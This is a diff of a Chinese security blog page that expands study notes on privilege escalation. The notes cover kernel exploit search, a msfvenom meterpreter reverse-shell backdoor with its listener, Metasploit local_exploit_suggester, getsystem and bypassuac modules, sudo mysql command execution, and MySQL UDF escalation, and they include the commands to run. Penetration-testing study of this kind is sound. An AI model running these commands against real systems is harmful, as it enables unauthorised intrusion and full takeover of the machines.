@@ -7,8 +7,8 @@
     <meta name="keywords" content="提权, 0x00dream&#39;s blog">
     <meta name="description" content="1.系统内核漏洞提权uname -a  #查看系统内核和版本信息
 然后searchexploit查找漏洞的exp
-或者http://www.exploit-db.com/漏洞利用平台
-# 如：找 Linux kali 6.8.11-amd6">
+	searchexploit 39166  # ubantu 14.04 的提权脚本
+或者http://www.exploit">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -436,21 +436,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-10
+                    2025-04-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    218
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 
@@ -470,10 +470,16 @@
             <div id="articleContent">
                 <h2 id="1-系统内核漏洞提权"><a href="#1-系统内核漏洞提权" class="headerlink" title="1.系统内核漏洞提权"></a>1.系统内核漏洞提权</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> -a  <span class="token comment">#查看系统内核和版本信息</span>
 然后searchexploit查找漏洞的exp
+	searchexploit <span class="token number">39166</span>  <span class="token comment"># ubantu 14.04 的提权脚本</span>
 或者http://www.exploit-db.com/漏洞利用平台
-<span class="token comment"># 如：找 Linux kali 6.8.11-amd64 exploit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment"># 如：找 Linux kali 6.8.11-amd64 exploit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="2-uid提权"><a href="#2-uid提权" class="headerlink" title="2.uid提权"></a>2.uid提权</h2><h2 id="3-msf提权"><a href="#3-msf提权" class="headerlink" title="3.msf提权"></a>3.msf提权</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成反弹shell后门</span>
+<h2 id="2-uid提权"><a href="#2-uid提权" class="headerlink" title="2.uid提权"></a>2.uid提权</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">上传msf木马进入后渗透meterpreter后，直接执行getsystem尝试提权<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="3-msf提权"><a href="#3-msf提权" class="headerlink" title="3.msf提权"></a>3.msf提权</h2><p>首先，创建后门并开启监听，靶机成功执行后进入到后渗透….</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成反弹shell后门</span>
 msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token operator">&lt;</span>local_ip<span class="token operator">&gt;</span> <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">7777</span> -f elf <span class="token operator">&gt;</span> ~/houmen.elf
 msfconsole
 use exploit/multi/handler  <span class="token comment"># 开启监听</span>
@@ -481,17 +487,62 @@ use exploit/multi/handler  <span class="token comment"># 开启监听</span>
 <span class="token builtin class-name">set</span> lhost <span class="token operator">&lt;</span>local_ip<span class="token operator">&gt;</span>
 <span class="token builtin class-name">set</span> lport <span class="token number">7777</span>
 run
-background
-use post/multi/recon/local_exploit_suggester  <span class="token comment"># 查找该session可用的提权exp</span>
-<span class="token comment">#post/multi/recon/local_exploit_suggester 是一个用于渗透测试中的后渗透分析模块，帮助测试人员在目标系统中识别和利用本地漏洞，提升权限或执行其他有用的攻击。</span>
-<span class="token builtin class-name">set</span> session <span class="token number">1</span>
-run
-use <span class="token number">1</span><span class="token punctuation">(</span>local_exploit_suggester模块扫描出的可用的exp<span class="token punctuation">)</span>
-<span class="token builtin class-name">set</span> session <span class="token number">1</span>
-run
-shell  <span class="token comment"># meterpreter后渗透模块下创建shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+background<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="4-sudo提权"><a href="#4-sudo提权" class="headerlink" title="4.sudo提权"></a>4.sudo提权</h2><h2 id="5-数据库提权"><a href="#5-数据库提权" class="headerlink" title="5.数据库提权"></a>5.数据库提权</h2>
+<p>然后下面有两种提权方式</p>
+<h3 id="lt-1-gt-在msf中利用系统内核漏洞提权模块进行提权"><a href="#lt-1-gt-在msf中利用系统内核漏洞提权模块进行提权" class="headerlink" title="<1>在msf中利用系统内核漏洞提权模块进行提权"></a>&lt;1&gt;在msf中利用系统内核漏洞提权模块进行提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use post/multi/recon/local_exploit_suggester  <span class="token comment"># 查找该session可用的提权exp	</span>
+或 use post/windows/gather/enum_patches
+    <span class="token comment">#它俩可以识别目标系统中存在的未打补丁的内核漏洞，并提供 利用该漏洞去提权和攻击 的模块。</span>
+    <span class="token builtin class-name">set</span> session <span class="token number">1</span>
+    run
+    use <span class="token number">1</span><span class="token punctuation">(</span>local_exploit_suggester模块扫描出的该靶机未打补丁的模块<span class="token punctuation">)</span>
+    <span class="token builtin class-name">set</span> session <span class="token number">1</span>
+    run
+meterpreter<span class="token operator">&gt;</span> shell  <span class="token comment"># meterpreter后渗透模块下创建shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="lt-2-gt-利用getsystem和bypassuac进行提权"><a href="#lt-2-gt-利用getsystem和bypassuac进行提权" class="headerlink" title="<2>利用getsystem和bypassuac进行提权"></a>&lt;2&gt;利用getsystem和bypassuac进行提权</h3><p>进入到后渗透后，可以直接执行<code>getsystem</code>进行提权，但是很多时候会失败，会提示管道内存问题、令牌问题、RPCSS变体等，并且即使成功也不稳定，很容易掉。</p>
+<p>于是先利用bypassuac，然后再执行<code>getsystem</code>，就非常稳定提权了！</p>
+<h4 id="①getsystem提权原理"><a href="#①getsystem提权原理" class="headerlink" title="①getsystem提权原理"></a>①getsystem提权原理</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、产生一个进程，它创建一个命名管道并等待服务来连接。
+<span class="token number">2</span>、创建一个新的Windows服务，设置为SYSTEM运行，去连接上面创建好的命名管道。
+<span class="token number">3</span>、该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
+<span class="token number">4</span>、然后用新收集的system模拟令牌产生cmd.exe，并且我们有一个system特权进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="②bypassuac"><a href="#②bypassuac" class="headerlink" title="②bypassuac"></a>②bypassuac</h4><p>msf中包含多个bypassuac模块，如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">exploit/windows/local/bypassuac
+exploit/windows/local/bypassuac_injection
+windows/local/bypassuac_vbs
+windows/local/ask<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/local/bypassuac
+<span class="token builtin class-name">set</span> session <span class="token number">1</span>  <span class="token comment">#上面后渗透的session</span>
+run    <span class="token comment"># run之后会进入到bypassuac之后的meterpreter下</span>
+meterpreter<span class="token operator">&gt;</span> getsystem   <span class="token comment">#此时再执行getsystem进行提权</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="1-gt-UAC是什么，为什么要绕过UAC"><a href="#1-gt-UAC是什么，为什么要绕过UAC" class="headerlink" title="1>.UAC是什么，为什么要绕过UAC"></a>1&gt;.UAC是什么，为什么要绕过UAC</h5><p>UAC(User Account Control 用户账户控制)，其主要目的是在执行可能影响系统设置或其他用户的操作时，通过弹出提示框的方式向用户请求权限，以此来防止恶意软件在用户不知情的情况下进行系统级的更改，保护系统的安全性和稳定性。当程序需要提升权限时，UAC 会根据系统设置和程序的权限要求，决定是否显示提示框让用户确认操作。</p>
+<p>简而言之就是下面这玩意儿，我们在打开软件时也经常会弹出来：</p>
+<p><img src="/2024/11/20/web-an-quan/ti-quan/image-20250409144900547.png" alt="image-20250409144900547"></p>
+<p>也就是说，我们直接getsystem的话，它会创建一个system运行的服务，然后连接上命名管道去请求system执行权限的时候，就可能会被上面这个UAC弹框给阻断，所以这就是我们提权不成功时为什么要先绕过UAC再提权的原因。</p>
+<h5 id="2-gt-bypassuac的原理"><a href="#2-gt-bypassuac的原理" class="headerlink" title="2>.bypassuac的原理"></a>2&gt;.bypassuac的原理</h5><p>BypassUAC 的核心原理是利用操作系统或应用程序中存在的漏洞、设计缺陷或特定的机制，在不触发 UAC 提示框的情况下，使程序获得管理员权限。攻击者或者一些需要高权限运行的工具会尝试找到系统中的薄弱环节，绕过 UAC 的权限验证过程。</p>
+<h2 id="4-sudo提权"><a href="#4-sudo提权" class="headerlink" title="4.sudo提权"></a>4.sudo提权</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l  <span class="token comment">#查看可以以root身份执行的命令</span>
+如mysql 可以用sudo去执行，我们就可以通过-e参数去执行命令
+	<span class="token function">sudo</span> mysql -e <span class="token string">'\! &lt;command&gt;'</span>   <span class="token comment">#mysql执行命令（前提是mysql无密码，否则需要知道它的密码）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="5-数据库提权"><a href="#5-数据库提权" class="headerlink" title="5.数据库提权"></a>5.数据库提权</h2><h3 id="lt-1-gt-UDF提权"><a href="#lt-1-gt-UDF提权" class="headerlink" title="<1>UDF提权"></a>&lt;1&gt;UDF提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql 提权方式有  udf提权、mof提权
+	searchexploit <span class="token number">1518</span>  <span class="token comment"># mysql 4.x/5.0的udf提权脚本（需要知道root的密码）</span>
+	此脚本提权步骤<span class="token punctuation">(</span>将脚本传到在目标机器后，在目标机器执行<span class="token punctuation">)</span>：
+		gcc -g -c raptor_udf2.c
+		gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+		mysql -uroot -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2024/11/20/web-an-quan/ti-quan/image-20250331145843575.png" alt="image-20250331145843575"></p>
+<p>最后执行<code>!sh</code>，就可以获得root权限了。</p>
+<h3 id="lt-2-gt-mof-提权"><a href="#lt-2-gt-mof-提权" class="headerlink" title="<2>mof 提权"></a>&lt;2&gt;mof 提权</h3><h2 id="6-缓冲区溢出漏洞提权-较难"><a href="#6-缓冲区溢出漏洞提权-较难" class="headerlink" title="6.缓冲区溢出漏洞提权(较难)"></a>6.缓冲区溢出漏洞提权(较难)</h2><p>学过缓冲区溢出提权，都会了解到SECRET文件夹目录</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm -g<span class="token operator">=</span>s -o -perm -4000 <span class="token operator">!</span> -type l -maxdepth <span class="token number">3</span> -exec <span class="token function">ls</span> -ld <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2024/11/20/web-an-quan/ti-quan/image-20250331150008888.png" alt="image-20250331150008888"></p>
+
                 
             </div>
             <hr/>
@@ -995,7 +1046,7 @@ shell  <span class="token comment"># meterpreter后渗透模块下创建shell</s
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">32.9k</span>
+                        class="white-color">46.7k</span>
             
             
             
